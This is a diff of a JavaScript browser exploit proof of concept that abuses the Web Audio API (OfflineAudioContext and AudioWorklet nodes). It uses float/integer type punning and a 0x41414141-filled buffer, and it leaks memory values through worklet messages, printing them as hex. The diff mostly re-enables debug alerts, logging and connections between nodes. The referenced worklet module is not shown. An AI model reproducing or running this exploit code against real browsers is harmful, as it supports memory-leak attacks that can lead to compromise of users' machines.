@@ -21,7 +21,7 @@
         qwordAsFloat = qword => {
             data_view.setUint32(0, qword%0x100000000, true);
             data_view.setUint32(4, qword/0x100000000, true);
-            //data_view.setBigUint64(0, qword);
+            data_view.setBigUint64(0, qword);
             return data_view.getFloat64(0);
         }
         function sleep(ms) {
@@ -44,27 +44,27 @@
             
             inputBufferU32.fill(0x41414141);
             
-            //console.log("1234")
+            console.log("1234")
             await audioCtx.audioWorklet.addModule("fuck.js");
-            //alert();
-            //await sleep(1000);
+            alert();
+            await sleep(1000);
             let originNode = new AudioWorkletNode(audioCtx, 'OrigineWorklet',{numberOfInputs:0, numberOfOutputs:1});
             let originNode2 = new AudioWorkletNode(audioCtx, 'OrigineWorklet2',{numberOfInputs:0, numberOfOutputs:1});
-            //return 0;
+            return 0;
             let source = new AudioBufferSourceNode(audioCtx);
             let myArrayBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
             await sleep(500);
-            //alert();
+            alert();
             let is_leak = true;
             originNode2.port.onmessage = async (e)=>{
                 if(e.data == "retry"){
-                    //print(e.data);
-                    //await sleep(2000);
+                    print(e.data);
+                    await sleep(2000);
                     location.reload();
                     return;
                 }
                 if(!is_leak){
-                    //console.log(e.data.toString(16));
+                    console.log(e.data.toString(16));
                     print(e.data);
                     return;
                 }
@@ -76,23 +76,23 @@
                         (`[${i}] : ` + floatAsQword(leak[i]).toString(16));
                 }
                 is_leak = false;
-                //await audioCtx.suspend(audioCtx.currentTime+ 0.01);
-                //console.log("suspend");
+                await audioCtx.suspend(audioCtx.currentTime+ 0.01);
+                console.log("suspend");
             }
-            //
+            
             originNode.connect(audioCtx.destination);
-            /*
+            
             inputBufferSrc.connect(originNode)
             .connect(outputBufferSrc)
             .connect(audioCtx.destination);
-            */
-            //originNode2.connect(audioCtx.destination);
+           
+            originNode2.connect(audioCtx.destination);
             await audioCtx.startRendering();
             
             alert("fuck");
             
         }
-        //alert();
-        //alert(window.OfflineAudioContext);
+        alert();
+        alert(window.OfflineAudioContext);
         main();
 </script>
